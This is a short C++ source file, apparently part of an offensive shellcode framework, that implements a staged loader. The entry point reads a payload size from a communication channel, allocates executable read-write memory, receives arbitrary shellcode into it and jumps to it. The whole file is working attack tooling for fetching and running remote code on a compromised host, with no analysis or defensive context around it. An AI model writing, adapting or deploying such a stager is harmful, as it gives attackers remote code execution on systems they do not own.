#include <factory.h>
#include <pico.h>

namespace Options {
    #if defined(PAYLOAD_SIZE) && (PAYLOAD_SIZE != 0)
    #define OPT_PAYLOAD_SIZE PAYLOAD_SIZE
    #else
    #define OPT_PAYLOAD_SIZE 0
    #endif

    constexpr static size_t payload_size = OPT_PAYLOAD_SIZE;
    constexpr static bool use_varsize = (payload_size == 0);
}

using namespace Pico;

typedef __attribute__((noreturn)) void (* shellcode)(void);

SHELLCODE_ENTRY
{
    auto channel = Options::channel();
    uint32_t buffer_size;
    void *memory;

    /* Read the size of the input buffer (4 bytes). */
    if ( Options::use_varsize )
        channel.recv(&buffer_size, sizeof(buffer_size));
    else
        buffer_size = Options::payload_size;

    /* Allocate memory for shellcode. */
    memory = Memory::allocate(buffer_size, Memory::READ | Memory::WRITE | Memory::EXEC);

    /* Read shellcode in memory. */
    channel.recv(memory, buffer_size);

    /* Execute shellcode. */
    ((shellcode) memory)();
}
